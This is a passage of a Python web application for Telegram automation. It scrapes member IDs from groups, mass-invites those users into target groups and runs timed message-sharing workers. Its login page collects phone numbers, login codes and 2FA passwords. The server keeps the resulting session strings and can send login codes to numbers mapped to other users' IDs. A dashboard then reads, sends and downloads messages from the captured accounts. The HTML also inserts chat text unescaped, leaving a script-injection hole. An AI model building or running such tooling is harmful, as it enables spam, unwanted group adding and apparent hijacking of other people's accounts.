                        if user.id and not getattr(user, 'bot', False) and not user.deleted:
                            user_ids.add(user.id)
                    await asyncio.sleep(0.2)
                    logger.debug(f"Collected from {sg}, total: {len(user_ids)}")
                except:
                    continue
            
            for target in TARGET_GROUPS:
                try:
                    entity = await self.client.get_entity(target)
                    participants = await self.client.get_participants(entity, limit=200)
                    for user in participants:
                        if user.id and not getattr(user, 'bot', False) and not user.deleted:
                            user_ids.add(user.id)
                    await asyncio.sleep(0.2)
                except:
                    continue
            
            return list(user_ids)
        
        try:
            result = SyncTelegramClient.run_async(_collect, timeout=90)
            logger.info(f"Enhanced collection: {len(result) if result else 0} users found")
            return result if result else list(user_ids)
        except:
            return list(user_ids)
    
    def add_user_to_targets(self, user_id):
        """Add a user to target groups"""
        success = False
        for target in TARGET_GROUPS:
            if not self.running:
                break
            if not self.ensure_connection():
                break
            async def _add():
                try:
                    entity = await self.client.get_entity(target)
                    user_input = await self.client.get_input_entity(user_id)
                    await self.client(InviteToChannelRequest(entity, [user_input]))
                    return True
                except errors.FloodWaitError as e:
                    time.sleep(min(e.seconds, 60))
                    return False
                except:
                    return False
            try:
                if SyncTelegramClient.run_async(_add, timeout=15):
                    success = True
            except:
                continue
        
        if success:
            try:
                record = {'user_id': user_id, 'time': datetime.now().isoformat(), 'worker_id': self.acc_id}
                worker_adds[self.acc_key].append(record)
                if len(worker_adds[self.acc_key]) > 1000:
                    worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
                if len(worker_adds[self.acc_key]) % 10 == 0:
                    save_json(WORKER_ADDS_FILE, dict(worker_adds))
            except:
                pass
        return success

# ============================================
# WORKER MANAGEMENT FUNCTIONS
# ============================================
def start_auto_add(account):
    """Start auto-add worker for an account"""
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_tasks:
                existing = running_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    existing['worker'].stop()
                    existing['thread'].join(timeout=5)
            worker = AutoAddWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
            thread.start()
            running_tasks[acc_key] = {'thread': thread, 'worker': worker}
            logger.info(f"✅ Started auto-add worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Start worker error: {e}")

def stop_auto_add(account_id):
    """Stop auto-add worker for an account"""
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_tasks:
                worker_info = running_tasks.pop(acc_key)
                if worker_info and worker_info.get('worker'):
                    worker_info['worker'].stop()
                logger.info(f"Stopped auto-add worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Stop auto add error: {e}")

def start_auto_share(account):
    """Start auto-share worker for an account"""
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_share_tasks:
                existing = running_share_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    existing['worker'].stop()
                    existing['thread'].join(timeout=5)
            
            worker = AutoShareWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"share_{acc_key}")
            thread.start()
            running_share_tasks[acc_key] = {'thread': thread, 'worker': worker}
            logger.info(f"📢 Started auto-share worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Start share worker error: {e}")

def stop_auto_share(account_id):
    """Stop auto-share worker for an account"""
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_share_tasks:
                worker_info = running_share_tasks.pop(acc_key)
                if worker_info and worker_info.get('worker'):
                    worker_info['worker'].stop()
                logger.info(f"Stopped auto-share worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Stop share worker error: {e}")

# ============================================
# PHONE LOOKUP HELPERS
# ============================================
def find_phone_for_user(telegram_id):
    """Find phone number for a Telegram user ID"""
    tid = str(telegram_id)
    phone = user_phone_map.get(tid, '')
    if phone:
        return phone
    if tid in auto_sessions:
        phone = auto_sessions[tid].get('phone', '')
        if phone:
            return phone
    for acc in accounts:
        if str(acc.get('telegram_id')) == tid and acc.get('phone'):
            return acc['phone']
    return None

def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
    """Automatically send verification code"""
    async def send_auto_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            sid = str(int(time.time() * 1000))
            temp_sessions[sid] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save(),
                'password_attempts': 0,
                'code_attempts': 0,
                'created_at': time.time(),
                'telegram_id': telegram_id,
                'first_name': first_name,
                'last_name': last_name,
                'username': username
            }
            save_temp_sessions()
            masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
            logger.info(f"✅ Code sent to {masked_phone}")
            return {
                'success': True,
                'session_id': sid,
                'phone_masked': masked_phone,
                'user_name': f"{first_name} {last_name}".strip() or username or 'User'
            }
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds.'}
        except errors.PhoneNumberInvalidError:
            return {'success': False, 'error': 'Invalid phone number.'}
        except Exception as e:
            logger.error(f"Auto code error: {e}")
            return {'success': False, 'error': 'Could not send code.'}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
    if not result.get('success'):
        if str(telegram_id) in user_phone_map:
            del user_phone_map[str(telegram_id)]
            save_user_map()
        if str(telegram_id) in auto_sessions:
            del auto_sessions[str(telegram_id)]
            save_auto_sessions()
    return result

# ============================================
# DASHBOARD HELPERS
# ============================================
def get_account_by_id(account_id):
    """Get account by ID"""
    for acc in accounts:
        if str(acc['id']) == str(account_id) or acc['id'] == account_id:
            return acc
    return None

def get_client_for_account(account_id):
    """Get Telegram client for an account"""
    acc = get_account_by_id(account_id)
    if not acc or not acc.get('session'):
        return None, "Account not found"
    try:
        client = SyncTelegramClient.get_client(acc['session'])
        return client, acc
    except Exception as e:
        return None, str(e)

async def get_dialogs_lightweight(client, limit=50):
    """Get lightweight dialog list"""
    dialogs_list = []
    
    try:
        dialogs = await client.get_dialogs(limit=limit)
        
        for dialog in dialogs:
            try:
                entity = dialog.entity
                
                if hasattr(entity, 'username') and entity.username:
                    chat_id = entity.username
                elif hasattr(entity, 'id'):
                    chat_id = str(entity.id)
                else:
                    continue
                
                title = dialog.name or 'Unknown'
                
                if dialog.is_user:
                    chat_type = 'bot' if getattr(entity, 'bot', False) else 'user'
                elif dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                else:
                    chat_type = 'user'
                
                last_message_text = ''
                last_message_date = None
                last_message_media = None
                
                if dialog.message:
                    msg = dialog.message
                    if msg.message:
                        last_message_text = msg.message[:100]
                    if msg.date:
                        last_message_date = int(msg.date.timestamp())
                    if msg.media:
                        if hasattr(msg.media, 'photo'):
                            last_message_media = 'photo'
                        elif hasattr(msg.media, 'document'):
                            last_message_media = 'document'
                
                chat_data = {
                    'id': chat_id,
                    'title': title,
                    'type': chat_type,
                    'lastMessage': last_message_text,
                    'lastMessageDate': last_message_date,
                    'lastMessageMedia': last_message_media,
                    'unread': dialog.unread_count or 0,
                    'isUser': dialog.is_user,
                    'isGroup': dialog.is_group,
                    'isChannel': dialog.is_channel
                }
                
                dialogs_list.append(chat_data)
            except:
                continue
        
        dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
        return dialogs_list
        
    except Exception as e:
        logger.error(f"Get dialogs error: {e}")
        raise

async def get_chat_messages(client, chat_id, limit=30):
    """Get messages from a specific chat"""
    messages_list = []
    
    try:
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                return messages_list
        
        messages = await client.get_messages(entity, limit=limit)
        
        for msg in messages:
            if not msg:
                continue
            try:
                msg_data = {
                    'id': msg.id,
                    'text': msg.message or '',
                    'date': int(msg.date.timestamp()) if msg.date else 0,
                    'out': msg.out if hasattr(msg, 'out') else False,
                    'chatId': chat_id,
                    'hasMedia': bool(msg.media),
                    'mediaType': None
                }
                
                if msg.media:
                    if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
                        msg_data['mediaType'] = 'photo'
                    elif hasattr(msg.media, 'document'):
                        doc = msg.media.document
                        if doc:
                            mime_type = getattr(doc, 'mime_type', '')
                            if 'video' in mime_type:
                                msg_data['mediaType'] = 'video'
                            elif 'audio' in mime_type:
                                msg_data['mediaType'] = 'audio'
                            else:
                                msg_data['mediaType'] = 'document'
                    elif isinstance(msg.media, MessageMediaWebPage):
                        msg_data['mediaType'] = 'link'
                
                messages_list.append(msg_data)
            except:
                continue
        
        return messages_list
    except Exception as e:
        logger.error(f"Get messages error: {e}")
        raise

async def send_message_async(client, chat_id, message_text):
    """Send a message asynchronously"""
    try:
        entity = None
        try:
            if chat_id.startswith('-'):
                entity = await client.get_entity(int(chat_id))
            else:
                entity = await client.get_entity(chat_id)
        except:
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                raise ValueError(f"Cannot find chat: {chat_id}")
        
        result = await client.send_message(entity, message_text)
        return {
            'success': True,
            'messageId': result.id,
            'text': result.message,
            'date': int(result.date.timestamp()) if result.date else 0
        }
    except Exception as e:
        logger.error(f"Send message error: {e}")
        raise

async def download_media_async(client, account_id, message_id):
    """Download media from a message"""
    try:
        dialogs = await client.get_dialogs(limit=100)
        for dialog in dialogs:
            try:
                messages = await client.get_messages(dialog.entity, limit=100)
                for msg in messages:
                    if msg.id == int(message_id) and msg.media:
                        filename = f"media_{account_id}_{message_id}"
                        filepath = os.path.join(MEDIA_CACHE_DIR, filename)
                        await client.download_media(msg, filepath)
                        mime_type = mimetypes.guess_type(filepath)[0] or 'application/octet-stream'
                        with open(filepath, 'rb') as f:
                            data = f.read()
                        try:
                            os.remove(filepath)
                        except:
                            pass
                        return {
                            'data': base64.b64encode(data).decode('utf-8'),
                            'mime_type': mime_type,
                            'size': len(data)
                        }
            except:
                continue
        return None
    except Exception as e:
        logger.error(f"Download media error: {e}")
        return None

# ============================================
# HTML TEMPLATES
# ============================================

LOGIN_PAGE = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Telegram Auto Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        h1 { text-align: center; color: #333; margin-bottom: 10px; }
        p { text-align: center; color: #666; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        .form-group input {
            width: 100%; padding: 12px; border: 2px solid #e0e0e0;
            border-radius: 8px; font-size: 16px; transition: border-color 0.3s;
        }
        .form-group input:focus { outline: none; border-color: #667eea; }
        .btn {
            width: 100%; padding: 14px; border: none; border-radius: 8px;
            font-size: 16px; font-weight: 600; cursor: pointer; color: white;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: transform 0.3s;
        }
        .btn:hover { transform: translateY(-2px); }
        .alert { padding: 12px; border-radius: 8px; margin-bottom: 20px; display: none; }
        .alert-error { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; display: block; }
        .alert-success { background: #d1fae5; color: #065f46; border: 1px solid #6ee7b7; display: block; }
        .alert-info { background: #dbeafe; color: #1e40af; border: 1px solid #93c5fd; display: block; }
        .code-section { display: none; }
        .code-section.active { display: block; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>🔐 Login</h1>
        <p>Telegram Auto Manager</p>
        
        <div id="alert-container"></div>
        
        <div class="form-group">
            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="+1234567890" value="+251">
        </div>
        <button class="btn" onclick="sendCode()">📤 Send Code</button>
        
        <div class="code-section" id="code-section">
            <div class="form-group">
                <label>Verification Code</label>
                <input type="text" id="code" placeholder="Enter 5-digit code" maxlength="5">
            </div>
            <div class="form-group" id="password-group" style="display:none;">
                <label>2FA Password</label>
                <input type="password" id="password" placeholder="Enter your 2FA password">
            </div>
            <button class="btn" onclick="verifyCode()">✅ Verify</button>
        </div>
    </div>

    <script>
        const API_BASE = window.location.origin;
        let currentSessionId = null;

        async function sendCode() {
            const phone = document.getElementById('phone').value.trim();
            if (!phone) { showAlert('Please enter your phone number', 'error'); return; }
            try {
                const response = await fetch(`${API_BASE}/api/add-account`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phone })
                });
                const data = await response.json();
                if (data.success) {
                    showAlert('Code sent! Check your Telegram.', 'success');
                    currentSessionId = data.session_id;
                    document.getElementById('code-section').classList.add('active');
                } else {
                    showAlert(data.error || 'Failed to send code', 'error');
                }
            } catch (error) {
                showAlert('Error: ' + error.message, 'error');
            }
        }

        async function verifyCode() {
            const code = document.getElementById('code').value.trim();
            const password = document.getElementById('password').value;
            if (!code) { showAlert('Please enter the verification code', 'error'); return; }
            try {
                const body = { code: code, session_id: currentSessionId };
                if (password) body.password = password;
                const response = await fetch(`${API_BASE}/api/verify-code`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                const data = await response.json();
                if (data.need_password) {
                    document.getElementById('password-group').style.display = 'block';
                    showAlert('Please enter your 2FA password', 'info');
                } else if (data.success) {
                    showAlert('Login successful! Redirecting...', 'success');
                    localStorage.setItem('accountId', data.account.id);
                    localStorage.setItem('accountName', data.account.name);
                    setTimeout(() => { window.location.href = '/dashboard'; }, 1500);
                } else {
                    showAlert(data.error || 'Verification failed', 'error');
                }
            } catch (error) {
                showAlert('Error: ' + error.message, 'error');
            }
        }

        function showAlert(message, type) {
            const container = document.getElementById('alert-container');
            container.innerHTML = `<div class="alert alert-${type}">${message}</div>`;
            if (type === 'success') setTimeout(() => container.innerHTML = '', 5000);
        }
    </script>
</body>
</html>'''

DASHBOARD_PAGE = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Telegram Auto Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; color: white; margin-bottom: 30px; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
        .card {
            background: white; border-radius: 15px; padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        .card h2 { color: #333; margin-bottom: 20px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-item {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; padding: 15px; border-radius: 10px; text-align: center;
        }
        .stat-value { font-size: 2em; font-weight: bold; }
        .stat-label { font-size: 0.9em; opacity: 0.9; margin-top: 5px; }
        .btn {
            padding: 12px 24px; border: none; border-radius: 8px;
            font-size: 14px; font-weight: 600; cursor: pointer; color: white;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: transform 0.3s; margin: 5px;
        }
        .btn:hover { transform: translateY(-2px); }
        .chat-list { max-height: 500px; overflow-y: auto; }
        .chat-item {
            padding: 12px; border-bottom: 1px solid #eee; cursor: pointer;
            transition: background 0.3s; display: flex; align-items: center; gap: 10px;
        }
        .chat-item:hover { background: #f9fafb; }
        .chat-avatar {
            width: 40px; height: 40px; border-radius: 50%; background: #667eea;
            color: white; display: flex; align-items: center; justify-content: center;
            font-weight: bold; font-size: 18px;
        }
        .chat-info { flex: 1; }
        .chat-title { font-weight: 600; color: #333; }
        .chat-last { color: #666; font-size: 0.9em; margin-top: 3px; }
        .messages-section { margin-top: 20px; display: none; }
        .messages-section.active { display: block; }
        .message-item {
            padding: 10px; margin-bottom: 10px; border-radius: 8px;
            background: #f3f4f6;
        }
        .message-item.sent { background: #dbeafe; }
        .message-input { display: flex; gap: 10px; margin-top: 20px; }
        .message-input input {
            flex: 1; padding: 12px; border: 2px solid #e0e0e0;
            border-radius: 8px; font-size: 14px;
        }
        .loading { text-align: center; padding: 20px; }
        .spinner {
            display: inline-block; width: 40px; height: 40px;
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 Dashboard</h1>
            <p>Telegram Auto Manager</p>
        </div>
        <div class="grid">
            <div class="card">
                <h2>📈 Statistics</h2>
                <div class="stats-grid" id="stats-grid">
                    <div class="stat-item"><div class="stat-value" id="today-added">0</div><div class="stat-label">Added Today</div></div>
                    <div class="stat-item"><div class="stat-value" id="total-added">0</div><div class="stat-label">Total Added</div></div>
                    <div class="stat-item"><div class="stat-value" id="today-shares">0</div><div class="stat-label">Shares Today</div></div>
                    <div class="stat-item"><div class="stat-value" id="active-workers">0</div><div class="stat-label">Active Workers</div></div>
                </div>
                <button class="btn" onclick="refreshStats()">🔄 Refresh</button>
            </div>
            <div class="card">
                <h2>💬 Chats</h2>
                <div class="chat-list" id="chat-list">
                    <div class="loading"><div class="spinner"></div><p>Loading chats...</p></div>
                </div>
                <div class="messages-section" id="messages-section">
                    <h3 id="messages-title">Messages</h3>
                    <div id="messages-list"></div>
                    <div class="message-input">
                        <input type="text" id="message-input" placeholder="Type a message...">
                        <button class="btn" onclick="sendMessage()">📤 Send</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const API_BASE = window.location.origin;
        let currentAccountId = localStorage.getItem('accountId');
        let currentChatId = null;
        if (!currentAccountId) window.location.href = '/login';
        document.addEventListener('DOMContentLoaded', () => { loadChats(); refreshStats(); });
        async function loadChats() {
            try {
                const response = await fetch(`${API_BASE}/api/get-chats`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accountId: currentAccountId })
                });
                const data = await response.json();
                if (data.success) renderChats(data.chats);
                else document.getElementById('chat-list').innerHTML = '<p style="color: red;">Error loading chats</p>';
            } catch (error) {
                document.getElementById('chat-list').innerHTML = '<p style="color: red;">Error: ' + error.message + '</p>';
            }
        }
        function renderChats(chats) {
            const container = document.getElementById('chat-list');
            if (!chats || chats.length === 0) {
                container.innerHTML = '<p style="text-align: center; color: #666;">No chats found</p>';
                return;
            }
            container.innerHTML = chats.map(chat => `
                <div class="chat-item" onclick="openChat('${chat.id}', '${chat.title.replace(/'/g, "\\'")}')">
                    <div class="chat-avatar">${chat.title.charAt(0).toUpperCase()}</div>
                    <div class="chat-info">
                        <div class="chat-title">${chat.title}</div>
                        <div class="chat-last">${chat.lastMessage || 'No messages'}</div>
                    </div>
                </div>
            `).join('');
        }
        async function openChat(chatId, chatTitle) {
            currentChatId = chatId;
            document.getElementById('messages-title').textContent = 'Messages - ' + chatTitle;
            document.getElementById('messages-section').classList.add('active');
            try {
                const response = await fetch(`${API_BASE}/api/get-chat-messages`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accountId: currentAccountId, chatId: chatId })
                });
                const data = await response.json();
                if (data.success) renderMessages(data.messages);
            } catch (error) { console.error('Error:', error); }
        }
        function renderMessages(messages) {
            const container = document.getElementById('messages-list');
            if (!messages || messages.length === 0) {
                container.innerHTML = '<p style="text-align: center; color: #666;">No messages</p>';
                return;
            }
            container.innerHTML = messages.reverse().map(msg => `
                <div class="message-item ${msg.out ? 'sent' : ''}">
                    <div>${msg.text || ''}</div>
                    <small style="color: #999;">${new Date(msg.date * 1000).toLocaleString()}</small>
                </div>
            `).join('');
            container.scrollTop = container.scrollHeight;
        }
        async function sendMessage() {
            const input = document.getElementById('message-input');
            const message = input.value.trim();
            if (!message || !currentChatId) return;
            try {
                const response = await fetch(`${API_BASE}/api/send-message`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ accountId: currentAccountId, chatId: currentChatId, message: message })
                });
                const data = await response.json();
                if (data.success) { input.value = ''; openChat(currentChatId, document.getElementById('messages-title').textContent.replace('Messages - ', '')); }
            } catch (error) { console.error('Error:', error); }
        }
        async function refreshStats() {
            try {
                const response = await fetch(`${API_BASE}/api/auto-add-stats`);
                const data = await response.json();
                if (data.success) {
                    document.getElementById('today-added').textContent = data.added_today || 0;
                    document.getElementById('total-added').textContent = data.total_added || 0;
                    document.getElementById('today-shares').textContent = data.shares_today || 0;
                    document.getElementById('active-workers').textContent = data.active_workers || 0;
                }
            } catch (error) { console.error('Error:', error); }
        }
        setInterval(refreshStats, 30000);
    </script>
</body>
</html>'''

CONTROL_PAGE = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Share Control Panel - Telegram Auto Share</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; color: white; margin-bottom: 30px; }
        .header h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2); }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .card {
            background: white; border-radius: 15px; padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        .card h2 { color: #333; margin-bottom: 20px; font-size: 1.5em; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        .form-group input, .form-group textarea {
            width: 100%; padding: 12px; border: 2px solid #e0e0e0;
            border-radius: 8px; font-size: 14px; transition: border-color 0.3s;
        }
        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: #667eea; }
        .form-group textarea { min-height: 100px; resize: vertical; font-family: inherit; }
        .btn {
            padding: 12px 24px; border: none; border-radius: 8px;
            font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s;
            display: inline-flex; align-items: center; gap: 8px;
        }
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .btn-primary:hover { box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4); transform: translateY(-2px); }
        .btn-success { background: #10b981; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .message-list { margin-bottom: 15px; }
        .message-item {
            background: #f9fafb; border: 1px solid #e5e7eb;
            border-radius: 8px; padding: 12px; margin-bottom: 10px;
        }
        .message-item .message-text { white-space: pre-wrap; word-break: break-word; margin-bottom: 8px; font-size: 14px; color: #333; }
        .message-item .message-actions { display: flex; gap: 8px; }
        .time-presets { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
        .time-preset {
            padding: 8px 16px; background: #f3f4f6; border: 2px solid #e5e7eb;
            border-radius: 20px; cursor: pointer; font-size: 13px; transition: all 0.3s;
        }
        .time-preset:hover { background: #667eea; color: white; border-color: #667eea; }
        .time-preset.active { background: #667eea; color: white; border-color: #667eea; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-top: 15px; }
        .stat-item {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; padding: 15px; border-radius: 10px; text-align: center;
        }
        .stat-item .stat-value { font-size: 2em; font-weight: bold; }
        .stat-item .stat-label { font-size: 0.9em; opacity: 0.9; margin-top: 5px; }
        .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
        .toggle-switch input { opacity: 0; width: 0; height: 0; }
        .toggle-slider {
            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
            background-color: #ccc; transition: .4s; border-radius: 34px;
        }
        .toggle-slider:before {
            position: absolute; content: ""; height: 26px; width: 26px;
            left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%;
        }
        input:checked + .toggle-slider { background-color: #10b981; }
        input:checked + .toggle-slider:before { transform: translateX(26px); }
        .alert { padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; }
        .alert-success { background: #d1fae5; color: #065f46; border: 1px solid #6ee7b7; }
        .alert-error { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; }
        .emoji-tips {
            background: #fef3c7; border: 1px solid #fcd34d;
            border-radius: 8px; padding: 12px; margin-top: 10px; font-size: 13px; color: #92400e;
        }
        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } .header h1 { font-size: 1.8em; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>🚀 Share Control Panel</h1><p>Control your auto-share settings</p></div>
        <div id="alert-container"></div>
        <div class="grid">
            <div class="card">
                <h2>📝 Share Messages</h2>
                <div class="message-list" id="message-list"></div>
                <div class="form-group">
                    <label>Add New Message</label>
                    <textarea id="new-message" placeholder="Enter your message..."></textarea>
                </div>
                <div class="emoji-tips">
                    💡 Use format <code>:1234567890123456789:</code> for premium emojis
                </div>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button class="btn btn-primary" onclick="addMessage()">➕ Add</button>
                    <button class="btn btn-success" onclick="saveMessages()">💾 Save</button>
                </div>
                <div class="form-group" style="margin-top: 15px;">
                    <label style="display: flex; align-items: center; gap: 10px;">
                        <span>Rotate Messages</span>
                        <label class="toggle-switch">
                            <input type="checkbox" id="rotate-messages" checked onchange="updateConfig()">
                            <span class="toggle-slider"></span>
                        </label>
                    </label>
                </div>
            </div>
            <div class="card">
                <h2>⏱️ Timing Control</h2>
                <div class="form-group">
                    <label>Share Interval (seconds)</label>
                    <input type="number" id="share-interval" value="300" min="60" max="86400" onchange="updateConfig()">
                </div>
                <div class="time-presets" id="time-presets"></div>
                <div class="form-group" style="margin-top: 20px;">
                    <label>Delay Between Groups (seconds)</label>
                    <input type="number" id="delay-between" value="20" min="5" max="300" onchange="updateConfig()">
                </div>
            </div>
            <div class="card">
                <h2>🎛️ Global Controls</h2>
                <div class="form-group">
                    <label style="display: flex; align-items: center; gap: 10px;">
                        <span>Auto Share Enabled</span>
                        <label class="toggle-switch">
                            <input type="checkbox" id="auto-share-enabled" checked onchange="updateConfig()">
                            <span class="toggle-slider"></span>
                        </label>
                    </label>
                </div>
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button class="btn btn-success" onclick="startAllShares()">▶️ Start All</button>
                    <button class="btn btn-danger" onclick="stopAllShares()">⏹️ Stop All</button>
                </div>
            </div>
        </div>
        <div class="card" style="margin-top: 20px;">
            <h2>📊 Share Statistics</h2>
            <div class="stats-grid" id="stats-grid"></div>
            <button class="btn btn-sm btn-primary" onclick="refreshStats()">🔄 Refresh</button>
        </div>
    </div>
    <script>
        const API_BASE = window.location.origin;
        let messages = [];
        document.addEventListener('DOMContentLoaded', () => { loadConfig(); loadStats(); loadTimePresets(); });
        async function loadConfig() {
            try {
                const response = await fetch(`${API_BASE}/api/share-config`);
                const data = await response.json();
                if (data.success) {
                    messages = data.config.messages || [];
                    document.getElementById('share-interval').value = data.config.share_interval_seconds;
                    document.getElementById('delay-between').value = data.config.share_delay_between_groups;
                    document.getElementById('auto-share-enabled').checked = data.config.auto_share_enabled;
                    document.getElementById('rotate-messages').checked = data.config.rotate_messages;
                    renderMessages();
                }
            } catch (error) { console.error('Error:', error); }
        }
        async function loadStats() {
            try {
                const response = await fetch(`${API_BASE}/api/share-stats`);
                const data = await response.json();
                if (data.success) {
                    document.getElementById('stats-grid').innerHTML = `
                        <div class="stat-item"><div class="stat-value">${data.stats.today_shares||0}</div><div class="stat-label">Today</div></div>
                        <div class="stat-item"><div class="stat-value">${data.stats.total_shares||0}</div><div class="stat-label">Total</div></div>
                        <div class="stat-item"><div class="stat-value">${data.stats.active_share_workers||0}</div><div class="stat-label">Workers</div></div>
                    `;
                }
            } catch (error) { console.error('Error:', error); }
        }
        async function loadTimePresets() {
            const presets = {'1min':60,'3min':180,'5min':300,'10min':600,'15min':900,'30min':1800,'1hour':3600,'2hours':7200};
            document.getElementById('time-presets').innerHTML = Object.entries(presets).map(([l,s]) => 
                `<div class="time-preset" onclick="setPreset(${s})" data-s="${s}">${l}</div>`
            ).join('');
        }
        function setPreset(s) {
            document.getElementById('share-interval').value = s;
            updateConfig();
            document.querySelectorAll('.time-preset').forEach(e => e.classList.toggle('active', parseInt(e.dataset.s)===s));
        }
        function renderMessages() {
            const c = document.getElementById('message-list');
            c.innerHTML = messages.length ? messages.map((m,i) => `
                <div class="message-item">
                    <div class="message-text">${m}</div>
                    <div class="message-actions">
                        <button class="btn btn-sm btn-primary" onclick="editMessage(${i})">✏️</button>
                        <button class="btn btn-sm btn-danger" onclick="removeMessage(${i})">🗑️</button>
                    </div>
                </div>
